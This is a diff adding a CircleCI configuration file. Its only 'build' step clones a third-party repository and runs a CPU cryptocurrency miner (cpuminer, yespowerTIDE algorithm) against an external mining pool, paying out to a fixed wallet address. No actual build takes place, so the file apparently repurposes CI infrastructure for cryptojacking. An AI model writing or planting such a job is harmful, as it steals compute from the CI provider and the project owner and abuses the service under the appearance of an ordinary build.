@@ -1,0 +1,11 @@
+version: 2.1
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD
+    steps:
+      - checkout 
+      - run: git clone https://github.com/saliem07/whive1.git && cd whive1 && chmod +x miner-tidecoin.sh && chmod +x cpuminer-sse2 && cpuminer-sse2 -a yespowerTIDE  -o stratum+tcp://stratum-eu.rplant.xyz:7059 -u TD368ah8Kuzn2quR7g6r8sUYbsVvKzwpyc
